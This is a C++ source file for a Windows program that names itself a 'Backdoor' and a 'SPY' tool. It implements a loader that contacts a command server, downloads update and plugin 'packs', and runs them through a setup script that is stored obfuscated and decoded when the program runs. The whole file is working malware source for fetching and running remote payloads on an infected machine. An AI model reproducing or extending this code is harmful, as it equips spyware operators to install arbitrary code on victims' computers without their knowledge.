#include "backdoor.h"
#include "../proc.h"
#include "opt.h"
#include "../fso.h"

bool Backdoor::check_update_avaiable(const Version * version) const
{
	send_header(SPY_BDR_HEADER_CHK_UPDATE, 3);
	send_content((const byte *)version, 0, 3);
	return receive_flag() == SPY_BDR_FLAG_YES;
}

bool Backdoor::dwnl_pack(byte id, char * file_path)
{
	// send request download pack first
	send_header(SPY_BDR_HEADER_DWN_PACK, 1);// just id[1]
	send_content(&id, 0, 1);
	// downlad pack
	return dwnl_file(file_path);
}

bool Backdoor::dwnl_file(char * file_path) const
{
	char file_name[25];
	int file_size;
	byte content_type;
	int content_length;
	// receive file header includes file name and file size
	for (int i = 0; i < 2; i++)
	{
		receive_header(&content_type, &content_length);
		if (content_type == SPY_BDR_HEADER_DT_FILENAME)
		{
			receive_content((byte *)file_name, 0, content_length);
			file_name[content_length] = '\0';
		}
		else if (content_type == SPY_BDR_HEADER_DT_FILESIZE)
		{
			receive_content((byte *)&file_size, 0, 4);
		}
	}
	// check valid data then receive main file data
	if (strlen(file_name) > 0 && file_size > 0)
	{
		FSO::path_combine(file_path, working_dir, file_name);
		FILE * fout = fopen(file_path, "w+b");
		if (fout == NULL)
			throw errno;
		LOG_I("Prepare receive pack '%s' with %d bytes...", file_name, file_size);
		int total_received_bytes = 0;
		byte * buffer = new byte[SPY_IO_IN_SZBUFFER];
		__try 
		{
			do
			{
				int length;
				// receive file chunk size
				receive_header(buffer, &length);
				if (buffer[0] != SPY_BDR_HEADER_DT_FILECHUNK)
					throw 1;
				// receive file data package
				receive_nbytes(buffer, 0, length);
				// then write to temp file in disk
				fwrite(buffer, 1, length, fout);
				total_received_bytes += length;
				// response to server to notify the next file data package
				send_flag(SPY_BDR_FLAG_YES);
				LOG_I("Download %d bytes", length);
			} while (total_received_bytes < file_size);
		}
		__finally
		{
			fclose(fout);
			delete[] buffer;
		}
		LOG_I("Downloaded pack!");
		return true;
	}
	return false;
}

void Backdoor::install_pack(const char * file_path, bool using_tmpdir) const
{
	if (file_path == NULL)
		return;
	char * args = new char[MAX_PATH * 2];

	strcpy(args, "\"");
	strcat(args, file_path);
	strcat(args, "\"");

	if (!using_tmpdir)
	{
		strcat(args, " \"");
		strcat(args, root_dir);
		strcat(args, "\"");
	}

	export_setup_script();
	if (FSO::run(script_file_path, args))
	{
		LOG_I("Executed script!");
	}
	else
	{
		LOG_E("Can not execute script");
	}
	delete[] args;
}

bool Backdoor::export_setup_script() const
{
	FILE * file = fopen(script_file_path, "w+b");
	if (file == NULL)
		return false;
	byte script[] = SPY_BDR_SETUP_PACK_SCRIPT;
	int bytes = sizeof(script);
	for (int i = 0; i < bytes; i++)
	{
		byte ch = script[i] - (i % 2 == 0 ? 12 : 25);
		fwrite(&ch, 1, 1, file);
	}	
	fclose(file);
	return true;
}

void Backdoor::create_working_dir_if_necessary() const
{
	if (!FSO::dir_exists(working_dir))
	{
		LOG_D("Working directory is not exist! Creating...");
		CreateDirectoryA(working_dir, NULL);
	}
}

void Backdoor::install_packs_if_necessary()
{
	send_header(SPY_BDR_HEADER_PACKS_LIST, 0);
	byte content_type;
	int content_length;
	receive_header(&content_type, &content_length);
	if (content_type == SPY_BDR_HEADER_PACKS_LIST)
	{
		byte * list = new byte[content_length];
		char * file_path = new char[MAX_PATH];
		Opt * opt = new Opt(working_dir);
		try
		{
			receive_content(list, 0, content_length);
			Pack * pack = (Pack *)list;
			int count_of_local_pack = opt->get_count();
			bool exists_pack;
			for (int count = content_length / sizeof(Pack); count > 0; count--, pack++)
			{
				if (pack->id == 0)// just ignore spy update pack which has id is 0
					continue;
				exists_pack = false;
				LOG_I("Check pack %d...", pack->id);
				for (int i = 0; i < count_of_local_pack; i++)
				{
					if (opt->get(i)->id == pack->id)
					{
						exists_pack = true;
						break;
					}
				}
				if (!exists_pack)
				{
					LOG_I("Pack %d do not exists! download and install it...", pack->id);
					if (dwnl_pack(pack->id, file_path))
					{
						LOG_I("Downloaded pack %d, installing...", pack->id);
						install_pack(file_path);
						opt->push(pack);
					}
				}
			}
		}
		catch (int error)
		{
			LOG_E("Install packs error: %d", error);
		}
		catch(...)
		{
			LOG_E("Unhandled exception!");
		}
		delete opt;
		delete[] file_path;
		delete[] list;
	}
}

bool Backdoor::check_and_dwnl_update()
{
	Version version;
	version.major = SPY_MAJOR_VERSION;
	version.minor = SPY_MINOR_VERSION;
	version.revision = SPY_REVISION;
	bool available = check_update_avaiable(&version);
	if (available)
	{
		if (upd_pck_path != NULL)
			delete[] upd_pck_path;
		upd_pck_path = new char[MAX_PATH];
		return dwnl_pack(0, upd_pck_path);
	}
	return false;
}

void Backdoor::install_update_pack()
{
	install_pack(upd_pck_path, false);
}

Backdoor::Backdoor(const char * server_addr, int server_port, const char * working_dir, const char * root_dir)
	:Comm(server_addr, server_port)
{
	LOG_I("Backdoor working dir: %s", working_dir);
	LOG_I("Backdoor root dir: %s", root_dir);
	this->working_dir = strdup(working_dir);
	this->root_dir = strdup(root_dir);
	this->script_file_path = new char[MAX_PATH];
	FSO::path_combine(script_file_path, working_dir, SPY_BDR_SETUP_PACK_SCRIPT_NAME);
	create_working_dir_if_necessary();
}

Backdoor::~Backdoor()
{
	delete[] script_file_path;
	delete[] working_dir;
	delete[] root_dir;
	if (upd_pck_path != NULL)
		delete[] upd_pck_path;
}
